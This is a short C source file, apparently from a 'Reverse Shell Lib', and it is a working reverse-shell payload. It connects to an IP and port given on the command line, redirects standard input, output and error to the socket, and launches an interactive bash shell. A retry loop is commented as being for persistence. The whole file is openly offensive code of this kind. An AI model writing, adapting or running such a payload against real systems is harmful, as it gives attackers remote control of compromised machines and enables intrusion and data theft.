/*
    Copyright 2021 by Zackary Morvan, Cyber M Technologies.
    All rights reserved
    This file is part of the Reverse Shell Lib (RSL), and is released 
    under the "MIT License Agreement". Please see the LICENSE file that
    should have been included as a part of this package
*/

#include <stdio.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <ctype.h>

#define DELIM "."
#define MAX_ATTEMPTS 50

bool is_valid_port(char *port)
{
    if (isdigit(*port))
    {
        int z;
        sscanf(port, "%d", &z);
        if (z > 0 && z < 65556)
        {
            return true;
        }
    }
    return false;
}

int connectSocket(int port, char *ip)
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ip);
    sa.sin_port = htons(port);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execl("/bin/bash", "-i", NULL);
    return 0;
}

int main(int argc, char *argv[])
{

    if (argc < 3)
    {
        printf("Invalid arguments");
        return 0;
    }
    
    char *ipContender = argv[1];
    char *portContender = argv[2];
    int is_valid_ip = 1;
    if (is_valid_port(portContender) == true)
    {
        int callbacks = 0;
        int port;
        sscanf(portContender, "%d", &port);
        char *ip = ipContender;
        //Inifinite reconnection loop *for persistence in case of error*
        while (callbacks < MAX_ATTEMPTS)
        {
            connectSocket(port, ip);
            printf("Retrying in 5s . . .");
            sleep(5);
            callbacks += 1;
        }      
    }
    else
    {
            printf("Invalid port for payload . . .");
            return 0;
    }
    return 0;
}
